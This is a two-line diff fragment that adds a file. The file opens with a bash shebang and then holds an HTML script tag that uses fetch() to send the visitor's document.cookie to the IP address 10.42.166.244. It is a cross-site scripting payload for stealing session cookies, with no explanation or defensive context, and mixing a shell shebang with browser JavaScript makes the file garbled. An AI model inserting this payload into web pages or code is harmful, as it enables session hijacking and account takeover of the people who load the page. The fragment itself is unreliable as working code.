@@ -1,0 +1,2 @@
+#!/bin/bash
+<script> fetch("http://10.42.166.244/.session=" + document.cookie)  </script>
